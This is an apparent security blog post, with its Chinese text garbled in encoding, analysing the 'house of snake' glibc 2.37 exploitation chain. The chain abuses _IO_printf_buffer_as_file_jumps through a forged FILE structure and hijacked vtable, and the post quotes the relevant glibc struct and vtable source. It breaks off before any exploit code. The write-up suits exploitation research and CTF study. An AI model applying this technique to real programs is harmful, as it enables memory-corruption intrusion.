<!DOCTYPE html>
<html>
  <head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  <meta name="description" content="">
  <meta name="keyword" content="">
  <title>
    
      house_of_snake:_IO_printf_buffer_as_file_jumpsåˆ©ç”¨åˆ†æ | 7resp4ss&#39;s blog
    
  </title>
  <!-- <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css"> -->

  <!-- <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"> -->
  <!-- <link href="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.css" rel="stylesheet"> -->
  <!-- <link href="https://cdn.bootcss.com/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet"> -->
  
<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/highlight_tomorrow.min.css">

  <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script> -->
  <!-- <script src="//cdn.bootcss.com/geopattern/1.2.3/js/geopattern.min.js"></script> -->
  <!-- <script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script> -->
  <!-- 
<script src="/js/qrious.js"></script>
<script src="/js/gitment.js"></script>
 -->
  
<script src="/js/jquery.min.js"></script>
<script src="/js/geopattern.min.js"></script>
<script src="/js/highlight.min.js"></script>
<script src="/js/fastclick.min.js"></script>


  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-104099189-1', 'auto');
    ga('send', 'pageview');

  </script>


</head>
  <body>
    <header class="header fixed-header">
  <div class="header-container">
    <a class="home-link" href="/">
      <div class="logo"></div>
      <!-- <span>7resp4ss's blog</span> -->
    </a>
    <ul class="right-list">
      
        <li class="list-item" >
          <!-- <div class="tooltip"> -->
            <!-- <span class="tooltiptext">ğŸ·</span> -->

            
            <a href="/tags/" class="item-link">ğŸ·</a>
          
        </li>
      
        <li class="list-item" >
          <!-- <div class="tooltip"> -->
            <!-- <span class="tooltiptext">ğŸ‘¨ğŸ»â€ğŸ’»</span> -->

            
            <a href="/about/" class="item-link">ğŸ‘¨ğŸ»â€ğŸ’»</a>
          
        </li>
      
    </ul>
    <div class="menu">
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </div>
    <div class="menu-mask">
      <ul class="menu-list">
        
          <li class="menu-item">
            
              <a href="/tags/" class="menu-link">ğŸ·</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/about/" class="menu-link">ğŸ‘¨ğŸ»â€ğŸ’»</a>
            
          </li>
        
      </ul>
    </div>
  </div>
</header>

    <div id="article-banner">
  <h2>house_of_snake:_IO_printf_buffer_as_file_jumpsåˆ©ç”¨åˆ†æ</h2>
</div>

<main class="app-body">
  <article class="post-article">
    <section class="markdown-content"   dir=""><h1 id="house-of-snakeï¼š-IO-printf-buffer-as-file-jumpsåˆ©ç”¨åˆ†æ"><a href="#house-of-snakeï¼š-IO-printf-buffer-as-file-jumpsåˆ©ç”¨åˆ†æ" class="headerlink" title="house_of_snakeï¼š_IO_printf_buffer_as_file_jumpsåˆ©ç”¨åˆ†æ"></a>house_of_snakeï¼š_IO_printf_buffer_as_file_jumpsåˆ©ç”¨åˆ†æ</h1><blockquote>
<p>æœ¬æ–‡é¦–å‘äº[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276471.htm">çœ‹é›ªè®ºå›</a>]ï¼Œä»…åœ¨ä¸ªäººåšå®¢è®°å½•</p>
</blockquote>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰å¬è¯´<code>glibc2.37</code>åˆ é™¤äº†<code>_IO_obstack_jumps</code>è¿™ä¸ª<code>vtable</code>ã€‚ä½†æ˜¯åœ¨æºç é‡Œè¿˜çœ‹åˆ°<code>obstack</code>ç»“æ„ä½“å­˜åœ¨ï¼Œé‚£ä¹ˆ<code>glibc2.37</code>çœŸçš„ä¸èƒ½å†è°ƒç”¨<code>_IO_obstack_jumps</code>çš„é‚£æ¡é“¾å—ï¼Ÿçœ‹å®Œæœ¬æ–‡å°±çŸ¥é“è¿˜å¯ä»¥è°ƒç”¨_<code>IO_obstack_jumps</code>é‚£æ¡é“¾çš„å…³é”®éƒ¨åˆ†ã€‚ä½†ç›®å‰è¿™æ¡é“¾åªå­˜åœ¨<code>glibc2.37</code>ï¼Œæ‰€ä»¥ç°åœ¨å¯èƒ½è¿˜æ²¡æœ‰åˆ©ç”¨åœºæ™¯ã€‚åœ¨æ­¤ç»“åˆæºç å’Œè‡ªå·±çš„ç†è§£å’Œå¤§å®¶åˆ†äº«ä¸€ä¸‹ï¼Œä¹Ÿæ„Ÿè°¢<code>roderick</code>å¸ˆå‚…å’Œ<code>whiter</code>å¸ˆå‚…çš„æŒ‡å¯¼ä¸æ”¯æŒã€‚å¦‚æœæœ‰å“ªé‡Œä¸å¯¹æ³è¯·å¸ˆå‚…ä»¬æ–§æ­£ï¼</p>
<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>åœ¨æ­¤ï¼Œæˆ‘ç§°è¿™æ¡é“¾ä¸º<code>house of snake</code>ï¼Œæ­¤åˆ©ç”¨é“¾ä¸<code>house of apple</code>ã€<code>house of cat</code>ã€<code>house of emma</code>ç­‰åˆ©ç”¨ä¸€æ ·ï¼Œåˆ©ç”¨äº†ä¿®æ”¹è™šè¡¨æŒ‡é’ˆçš„æ–¹æ³•ã€‚ä¸»è¦æ€è·¯å°±æ˜¯ä¼ªé€ ç›¸å…³ç»“æ„ä½“å¹¶ä¸”ä¿®æ”¹è™šè¡¨æŒ‡é’ˆä¸º<code>_IO_printf_buffer_as_file_jumps</code>å®ç°æ”»å‡»ã€‚</p>
<h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>1.èƒ½ä¿®æ”¹<code>stdout</code>ã€<code>stdin</code>ã€<code>stderr</code>å…¶ä¸­ä¸€ä¸ª<code>_IO_FILE_plus</code>ç»“æ„(fastbin attackæˆ–tcachebin attack)æˆ–åŠ«æŒ <code>_IO_list_all</code>ã€‚(å¦‚<code>large bin attack</code>ã€<code>tcache stashing unlink attack</code>ã€<code>fastbin reverse into tcache</code>)</p>
<p>2.èƒ½å¤Ÿè§¦å‘<code>IO</code>æµï¼Œæ‰§è¡Œ<code>IO</code>ç›¸å…³å‡½æ•°ã€‚</p>
<p>3.èƒ½å¤Ÿæ³„éœ²å †åœ°å€å’Œ<code>libc</code>åŸºå€ã€‚</p>
<h2 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><h4 id="vtable-åŠ«æŒçš„æ£€æµ‹æªæ–½"><a href="#vtable-åŠ«æŒçš„æ£€æµ‹æªæ–½" class="headerlink" title="vtable åŠ«æŒçš„æ£€æµ‹æªæ–½"></a>vtable åŠ«æŒçš„æ£€æµ‹æªæ–½</h4><p>åœ¨ <code>2.24</code> ç‰ˆæœ¬çš„ <code>glibc</code> ä»¥åï¼ŒåŠ å…¥äº†é’ˆå¯¹ <code>IO_FILE_plus</code> çš„ <code>vtable</code> åŠ«æŒçš„æ£€æµ‹æªæ–½ï¼Œ<code>glibc</code> ä¼šåœ¨è°ƒç”¨è™šå‡½æ•°ä¹‹å‰é¦–å…ˆæ£€æŸ¥ <code>vtable</code> åœ°å€çš„åˆæ³•æ€§ã€‚é¦–å…ˆä¼šéªŒè¯ <code>vtable</code> æ˜¯å¦ä½äº<code>_IO_vtable</code> æ®µä¸­ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶å°±æ­£å¸¸æ‰§è¡Œï¼Œå¦åˆ™ä¼šè°ƒç”¨<code>_IO_vtable_check</code> åšè¿›ä¸€æ­¥æ£€æŸ¥ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼Œå¦‚æœ vtable åœ°å€æ˜¯éæ³•çš„ï¼Œé‚£ä¹ˆä¼šå¼•å‘ <code>abort</code>ã€‚</p>
<h4 id="IO-FILEç»“æ„ä½“"><a href="#IO-FILEç»“æ„ä½“" class="headerlink" title="_IO_FILEç»“æ„ä½“"></a>_IO_FILEç»“æ„ä½“</h4><p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">      <span class="type">int</span> _flags;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span> </span><br><span class="line">    <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">    <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">    <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">    <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">    <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    _IO_off_t _old_offset;	<span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN	<span class="comment">/* temporary */</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">    <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">    <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line">    _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è¯¥ç»“æ„ä½“åº”è¯¥ä¸éš¾ç†è§£ï¼Œä¸è¿‡å¤šèµ˜è¿°ã€‚</p>
<h4 id="IO-jump-tç»“æ„ä½“"><a href="#IO-jump-tç»“æ„ä½“" class="headerlink" title="_IO_jump_tç»“æ„ä½“"></a>_IO_jump_tç»“æ„ä½“</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬å¯¹ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡<code>fp</code>è¿›è¡Œæ“ä½œæ—¶ï¼Œå¾€å¾€ä¼šä½¿ç”¨åˆ°<code>_IO_jump_t</code>ç»“æ„ä½“å†…æŸä¸€å‡½æ•°ã€‚</p>
<h4 id="IO-FILE-plusç»“æ„ä½“"><a href="#IO-FILE-plusç»“æ„ä½“" class="headerlink" title="_IO_FILE_plusç»“æ„ä½“"></a>_IO_FILE_plusç»“æ„ä½“</h4><p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯åœ¨<code>_IO_FILE</code>è¿½åŠ äº†ä¸ªæŒ‡å‘<code>_IO_jump_t</code>ç»“æ„ä½“çš„æŒ‡é’ˆã€‚</p>
<h4 id="printf-bufferç»“æ„ä½“"><a href="#printf-bufferç»“æ„ä½“" class="headerlink" title="__printf_bufferç»“æ„ä½“"></a>__printf_bufferç»“æ„ä½“</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *write_base;</span><br><span class="line">  <span class="type">char</span> *write_ptr;</span><br><span class="line">  <span class="type">char</span> *write_end;</span><br><span class="line">  <span class="type">uint64_t</span> written;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>äº†è§£å­˜åœ¨è¿™ä¸ªç»“æ„ä½“å³å¯ã€‚</p>
<h4 id="printf-buffer-as-fileç»“æ„ä½“"><a href="#printf-buffer-as-fileç»“æ„ä½“" class="headerlink" title="__printf_buffer_as_fileç»“æ„ä½“"></a>__printf_buffer_as_fileç»“æ„ä½“</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>FILE</code>å°±æ˜¯<code>_IO_FILE_plus</code>ï¼Œå°±æ˜¯åœ¨<code>_IO_FILE_plus</code>ç»“æ„ä½“åè¿½åŠ äº†ä¸ªæŒ‡å‘<code>__printf_buffer</code>ç»“æ„ä½“çš„æŒ‡é’ˆã€‚è¿™ä¸ªç»“æ„ä½“æ˜¯å…³é”®ç»“æ„ä½“ä¹‹ä¸€ï¼Œå› ä¸ºæœ¬æ–‡æåŠçš„è°ƒç”¨é“¾ç¦»ä¸å¼€è¿™ä¸ªç»“æ„ä½“ã€‚</p>
<p>ç®€å•æ€»ç»“ä¸€ä¸‹ï¼Œå°±æ˜¯ä¸€ä¸ªå¸¸è§çš„<code>_IO_FILE_plus</code>åé¢è¿½åŠ äº†ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼Œæˆ‘ä»¬åªè¦è®¤è¯†åˆ°è¿™ä¸€ç‚¹å°±è¡Œäº†ã€‚</p>
<h4 id="obstackç»“æ„ä½“"><a href="#obstackç»“æ„ä½“" class="headerlink" title="obstackç»“æ„ä½“"></a>obstackç»“æ„ä½“</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">				     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">				     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åœ¨æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“æœ‰è¿™ä¸ªç»“æ„ä½“å³å¯ï¼Œä¸éœ€è¦è¿‡å¤šçš„æ¢ç©¶æ¯ä¸ªæˆå‘˜çš„æ„ä¹‰ã€‚</p>
<h4 id="printf-buffer-obstackç»“æ„ä½“"><a href="#printf-buffer-obstackç»“æ„ä½“" class="headerlink" title="__printf_buffer_obstackç»“æ„ä½“"></a>__printf_buffer_obstackç»“æ„ä½“</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯åœ¨<code>__printf_buffer</code>ç»“æ„ä½“åè¿½åŠ äº†ä¸€ä¸ª<code>obstack</code>ç»“æ„ä½“æŒ‡é’ˆå’Œä¸€ä¸ª<code>char</code>ç±»å‹çš„å˜é‡ï¼Œè¿™ä¸ªç»“æ„ä½“ä¹Ÿæ˜¯å…³é”®ç»“æ„ä½“ä¹‹ä¸€ã€‚</p>
<h3 id="è°ƒç”¨é“¾åˆ†æ"><a href="#è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h3><h4 id="IO-printf-buffer-as-file-jumps"><a href="#IO-printf-buffer-as-file-jumps" class="headerlink" title="_IO_printf_buffer_as_file_jumps"></a>_IO_printf_buffer_as_file_jumps</h4><p>ç”±ä¸Šå¯çŸ¥ï¼Œ<code>vtable</code>å¿…é¡»åˆæ³•ï¼Œåœ¨<code>glibc2.37</code>ä¸­æœ‰ä¸€ä¸ªæ–°çš„<code>vtable</code>ï¼Œæºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),<span class="comment">//å‡½æ•°ä¸€</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),<span class="comment">//å‡½æ•°äºŒ</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯çŸ¥ï¼Œè¯¥<code>vtable</code>å†…åªå­˜åœ¨ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«ä¸º<code>__printf_buffer_as_file_overflow</code>ï¼Œ<code>__printf_buffer_as_file_xsputn</code></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆå¯¹<code>__printf_buffer_as_file_overflow</code>è¿›è¡Œåˆ†æã€‚</p>
<h6 id="å‰è¨€-1"><a href="#å‰è¨€-1" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h6><p>ç¬”è€…å¯¹è¯¥åˆ©ç”¨é“¾åˆ†æå…ˆå…³æ³¨è°ƒç”¨è¿‡ç¨‹ï¼Œè¦ç»•è¿‡çš„æ¡ä»¶å…ˆæŒ‰ä¸‹ä¸è¡¨ï¼Œæœ€åå†æ€»ç»“ï¼</p>
<h6 id="printf-buffer-as-file-overflowå‡½æ•°"><a href="#printf-buffer-as-file-overflowå‡½æ•°" class="headerlink" title="__printf_buffer_as_file_overflowå‡½æ•°"></a>__printf_buffer_as_file_overflowå‡½æ•°</h6><p>æºç å¦‚ä¸‹ï¼š</p>
